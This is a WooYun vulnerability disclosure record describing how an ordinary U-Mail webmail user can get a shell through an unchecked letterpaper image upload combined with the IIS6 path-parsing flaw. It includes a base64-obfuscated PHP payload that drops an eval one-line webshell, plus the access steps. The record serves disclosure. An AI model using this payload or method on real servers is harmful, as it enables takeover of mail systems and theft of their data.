{"id": 2094, "wybug_id": "wooyun-2014-061055", "wybug_title": "U-Mail邮件系统普通用户权限getshell漏洞-2", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2014-05-17 21:53", "wybug_open_date": "2014-08-15 21:54", "wybug_type": "默认配置不当", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向公众公开  简要描述： U-Mail邮件系统windows版本存在缺陷，导致普通用户getshell 详细说明：  环境说明：官网下载windows版最新版，windows server 2003+IIS6搭建、登录邮箱测试时候使用最新版chrome浏览器，需要普通用户登录漏洞文件：C:\\umail\\WorldClient\\html\\client\\option\\module\\o_letterpaper.php代码：\nif ( ACTION == \"letterpaper-img-upload\" ){        $targetFolder = getusercachepath( );        $verifyToken = md5( \"unique_salt\".$_POST['timestamp'] );        if ( !empty( $_FILES ) || $_POST['token'] == $verifyToken )        {                $tempFile = $_FILES['Filedata']['tmp_name'];                $targetPath = $targetFolder;                $targetFile = rtrim( $targetPath, \"/\" ).\"/letterpaper_\".$_FILES['Filedata']['name'];                $fileTypes = array( \"jpg\", \"jpeg\", \"gif\", \"png\" );                $fileParts = pathinfo( $_FILES['Filedata']['name'] );                if ( in_array( $fileParts['extension'], $fileTypes ) )                {                        $handle = opendir( $targetPath );                        while ( ( $file = readdir( $handle ) ) !== FALSE )                        {                                if ( !( $file != \".\" ) && !( $file != \"..\" ) && strpos( $file, \"letterpaper_\" ) === FALSE )                                {                                        $dir = rtrim( $targetPath, \"/\" ).DIRECTORY_SEPARATOR.$file;                                        unlink( $dir );                                }                        }                        closedir( $handle );                        if ( move_uploaded_file( $tempFile, $targetFile ) )                        {                                $thumbFile = rtrim( $targetPath, \"/\" ).\"/letterpaper_\".$fileParts['filename'].\"_thumb.\".$fileParts['extension'];                                $thumbUrl = rtrim( WEBMAIL_URL, \"/\" ).\"/cache/\".$user_id.\"/letterpaper_\".$fileParts['filename'].\"_thumb.\".$fileParts['extension'];                                $targetUrl = rtrim( WEBMAIL_URL, \"/\" ).\"/cache/\".$user_id.\"/letterpaper_\".$_FILES['Filedata']['name'];                                if ( img2thumb( $targetFile, $thumbFile, $width = 100, $height = 100, $cut = 1, $proportion = 0 ) )                                {                                        dump_json( array(                                                \"status\" => 1,                                                \"file\" => $targetFile,                                                \"fileUrl\" => $targetUrl,                                                \"thumb\" => $thumbFile,                                                \"thumbUrl\" => $thumbUrl                                        ) );                                }                                else                                {                                        unlink( $targetFile );                                        exit( );                                }                        }                }                else                {                        dump_json( array( \"status\" => 0, \"msg\" => \"Invalid file type.\" ) );                }        }}\n此处为信纸的上传图片的页面，只允许jpg等图片格式的上传，由于是windows版的，可以结合iis6.0的解析漏洞，但上传成功a.php;a.jpg时候会提示错误，脚本执行错误500。然后此php是以fastcgi形式跑的，因而利用v.jpg/a.php解析漏洞。此默认安装包的php版本为\n\n漏洞利用过程准备图片木马，必须是图片，然后里面需嵌入php代码为<?php @fwrite(fopen(base64_decode('ZnVjay5waHA='),w), base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydmdWNrJ10pOz8+'));注意不要闭合，会报错。代码执行后会在当前目录下生成fuck.php的一句话木马此处的图片木马为\n\n若不是图片木马，则在执行函数的 if ( img2thumb( $targetFile, $thumbFile, $width = 100, $height = 100, $cut = 1, $proportion = 0 ) )会出错，查看到的相应内容里不会有上传后的地址，如图\n\nchrome浏览登录邮箱后，设置代理\n\n查看响应\n\n获得的上传后地址为，/webmail/client/cache/5/letterpaper_v.jpgok，浏览器访问//webmail/client/cache/5/letterpaper_v.jpg/a.php\n\n官网未提供设置信纸功能，但同样可以本地提交，修改post地址获取webshell，未具体测试官网是有解析漏洞的，如下\n\n   漏洞证明：  如上详细描述   修复方案：  :)好多啊，你懂的   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-22 17:55 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向软件生产厂商深圳市福洽科技有限公司通报 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-18 19:38 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  有几张图片好像没传好，应该不影响    \n     2014-05-18 19:47 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Ano_Tom 大神！那是乌云的问题，最近很多图片都XX了    \n     2014-05-18 19:49 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  @U神 难怪，我以为我传的原因。:)    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}